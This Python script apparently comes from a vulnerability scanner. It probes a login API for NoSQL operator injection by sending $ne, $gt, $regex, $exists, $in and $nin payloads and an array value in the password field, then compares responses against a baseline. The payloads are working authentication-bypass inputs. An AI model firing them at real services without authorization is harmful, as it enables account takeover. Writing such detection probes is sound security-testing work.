#!/usr/bin/env python3
"""NoSQL operator injection probe — send $ne/$gt operators to detect query manipulation.

Output: measurements only; no status or confidence.
Exit codes: 0 = probes completed.
"""

import hashlib
import json
import sys
import time
import urllib.request
import urllib.error

# Configuration — replace before running
TARGET_URL = "http://localhost:3000/api/login"
PARAM = "password"
AUTH_HEADER = ""  # Optional

# Operator injection payloads — each sends a JSON body with NoSQL operators
OPERATOR_PROBES = [
    ("ne_empty", {"$ne": ""}),
    ("ne_null", {"$ne": None}),
    ("gt_empty", {"$gt": ""}),
    ("regex_wildcard", {"$regex": ".*"}),
    ("exists_true", {"$exists": True}),
    ("in_array", {"$in": ["admin", "password", "test"]}),
    ("nin_empty", {"$nin": []}),
]


def make_request(url, body_dict, headers=None):
    """Send POST request with JSON body, return round result dict and body."""
    data = json.dumps(body_dict).encode("utf-8")
    req = urllib.request.Request(url, data=data, method="POST")
    req.add_header("Content-Type", "application/json")
    if headers:
        for k, v in headers.items():
            req.add_header(k, v)

    start = time.monotonic()
    try:
        resp = urllib.request.urlopen(req, timeout=10)
        body = resp.read().decode("utf-8", errors="replace")
        elapsed = int((time.monotonic() - start) * 1000)
        return {
            "status_code": resp.status,
            "elapsed_ms": elapsed,
            "body_hash": hashlib.sha256(body.encode()).hexdigest(),
            "body_length": len(body),
        }, body
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", errors="replace")
        elapsed = int((time.monotonic() - start) * 1000)
        return {
            "status_code": e.code,
            "elapsed_ms": elapsed,
            "body_hash": hashlib.sha256(body.encode()).hexdigest(),
            "body_length": len(body),
        }, body
    except Exception as e:
        elapsed = int((time.monotonic() - start) * 1000)
        return {
            "status_code": 0,
            "elapsed_ms": elapsed,
            "body_hash": "",
            "body_length": 0,
            "error": str(e),
        }, ""


def main():
    started_at = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
    headers = {}
    if AUTH_HEADER:
        headers["Authorization"] = AUTH_HEADER

    probe_count = 0

    # Step 1: Baseline — normal string value
    baseline_body_dict = {PARAM: "ensphere_baseline_value"}
    probe_count += 1
    baseline_round, baseline_resp = make_request(TARGET_URL, baseline_body_dict, headers)
    print(f"[BASELINE] status={baseline_round['status_code']}, len={baseline_round['body_length']}, time={baseline_round['elapsed_ms']}ms", file=sys.stderr)

    # Step 2: Operator injection probes
    probe_results = []
    for name, operator_value in OPERATOR_PROBES:
        probe_count += 1
        probe_body_dict = {PARAM: operator_value}
        probe_round, probe_resp = make_request(TARGET_URL, probe_body_dict, headers)
        print(f"[PROBE:{name}] status={probe_round['status_code']}, len={probe_round['body_length']}, time={probe_round['elapsed_ms']}ms", file=sys.stderr)
        time.sleep(0.3)

        probe_results.append({
            "name": name,
            "operator": json.dumps(operator_value),
            "round": probe_round,
            "status_matches_baseline": probe_round["status_code"] == baseline_round["status_code"],
            "hash_matches_baseline": probe_round["body_hash"] == baseline_round["body_hash"],
            "length_delta": probe_round["body_length"] - baseline_round["body_length"],
        })

    # Step 3: Array injection — send param as array instead of string
    probe_count += 1
    array_body_dict = {PARAM: ["admin"]}
    array_round, array_resp = make_request(TARGET_URL, array_body_dict, headers)
    print(f"[ARRAY] status={array_round['status_code']}, len={array_round['body_length']}", file=sys.stderr)

    result = {
        "vuln_type": "nosql",
        "technique": "operator_injection",
        "started_at": started_at,
        "probe_count": probe_count,
        "measurements": {
            "baseline": baseline_round,
            "operator_probes": probe_results,
            "array_injection": {
                "round": array_round,
                "status_matches_baseline": array_round["status_code"] == baseline_round["status_code"],
                "hash_matches_baseline": array_round["body_hash"] == baseline_round["body_hash"],
            },
            "probes_tested": len(OPERATOR_PROBES),
        },
    }

    print(json.dumps(result, indent=2))


if __name__ == "__main__":
    main()
